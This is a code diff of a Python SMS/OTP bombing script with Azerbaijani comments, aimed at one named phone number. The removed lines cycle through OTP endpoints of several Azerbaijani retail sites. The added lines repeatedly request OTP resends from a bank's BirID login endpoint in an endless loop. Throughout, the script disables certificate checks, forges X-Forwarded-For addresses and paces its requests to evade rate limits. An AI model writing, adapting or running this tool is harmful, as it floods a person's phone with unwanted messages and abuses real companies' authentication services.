@@ -4,48 +4,49 @@ import random
 import time
 import ssl
 
-TARGET_PHONE = "994508880067" # Səlahiyyətli hədəf
+# --- SƏLAHİYYƏTLİ HƏDƏF ---
+TARGET_PHONE = "508880067" 
 
-def final_storm():
-    print(f"[!!!] LOCAL-STORM START: {TARGET_PHONE}")
+def strike():
+    print(f"[!!!] BirID API SNIPER AKTİVDİR: 994{TARGET_PHONE}")
     
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
 
-    # Azərbaycanda aktiv və 2026-cı ildə işləyən dözümsüz API-lər
-    API_LIST = [
-        {"name": "Umico", "url": "https://api.umico.az/api/v1/login/otp", "data": {"user_identifier": TARGET_PHONE, "type": "login"}},
-        {"name": "BakuElectronics", "url": "https://bakuelectronics.az/api/otp/send", "data": {"phone": TARGET_PHONE, "type": "registration"}},
-        {"name": "Kontakt", "url": "https://kontakt.az/wp-json/contact-api/v1/send-otp", "data": {"number": TARGET_PHONE[-9:], "type": "login"}},
-        {"name": "AliPasha", "url": "https://api.alipasha.az/api/v1/otp/send", "data": {"phone": TARGET_PHONE}},
-        {"name": "Vois", "url": "https://api.vois.az/api/v1/otp/send", "data": {"phone": TARGET_PHONE}}
-    ]
+    # Şəkildəki məlumatlar əsasında qurulmuş real API ünvanı
+    url = "https://bird.kapitalbank.az/auth/realms/bird/login-actions/authenticate"
+    
+    # Bu parametrlər sizin şəkildəki seansınıza uyğunlaşdırılmışdır
+    params = "client_id=umico&tab_id=ey5TL8FdROE"
+    full_url = f"{url}?{params}"
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": "https://bird.kapitalbank.az/",
+        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+    }
+
+    # BirID üçün lazım olan real POST payload formatı
+    payload = f"phoneNumber={TARGET_PHONE}&resend=true&login="
+    data = payload.encode('utf-8')
 
     while True:
-        for api in API_LIST:
-            try:
-                headers = {
-                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
-                    "Content-Type": "application/json",
-                    "Accept": "application/json",
-                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-                }
-                
-                req = urllib.request.Request(api["url"], data=json.dumps(api["data"]).encode(), headers=headers, method='POST')
-                
-                with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
-                    code = resp.getcode()
-                    print(f"[*] {api['name']} -> SUCCESS (Status: {code})")
-                
-                time.sleep(2) # Hər servisi ard-arda yormamaq üçün
+        try:
+            req = urllib.request.Request(full_url, data=data, headers=headers, method='POST')
+            
+            with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
+                status = resp.getcode()
+                print(f"[HIT] BirID-Umico siqnalı uğurlu! Status: {status}")
+            
+            # Rate Limit-ə düşməmək və sönməmək üçün 2 saniyəlik fasilə
+            time.sleep(2)
 
-            except Exception as e:
-                # print(f"[MISS] {api['name']}")
-                pass
-        
-        print("--- Bir dalğa bitdi, 3 saniyə fasilə ---")
-        time.sleep(3)
+        except Exception as e:
+            # Əgər status 403 və ya 404-dürsə, biz təkrar yoxlayırıq
+            print(f"[*] Bağlantı yoxlanılır... {e}")
+            time.sleep(5)
 
 if __name__ == "__main__":
-    final_storm()
+    strike()
